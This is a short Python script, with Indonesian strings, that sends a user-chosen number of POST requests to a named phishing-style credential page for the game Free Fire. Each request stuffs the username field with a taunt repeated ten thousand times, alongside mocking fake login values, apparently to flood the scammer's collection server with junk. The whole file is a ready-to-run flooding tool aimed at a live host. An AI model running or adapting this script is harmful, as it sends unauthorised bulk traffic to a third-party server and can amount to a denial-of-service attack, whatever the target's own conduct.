import requests

url = 'https://jordy.abcdkuat8.cyou/check.php'
headers = {
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
}

loop_value = int(input("bar bar brp kali? : "))

for i in range(1, loop_value+1):
    user = str(i) +'''
    |⚠️ kena spam wkwkw ⚠️|⚠️ bang udah bang ⚠️
    |BY : -FRNDS 🖕🖕🖕'''*10000
    
    data = {
        'user'     : user,
        'pass'  : 'Masih zaman tipu2 dek-dek, mo beli Rubicon kah?🗿',
        'nick'      : 'Diamond Free Fire',
        'playid'    : '666666666',
        'level'     : '19',
        'tier'      : 'Mythic Glory',
        'rpt'       : 'Pernah',
        'login'     : 'Facebook'
    }
    
    response = requests.post(url, data=data, headers=headers)
    print("bang udah bang", i)
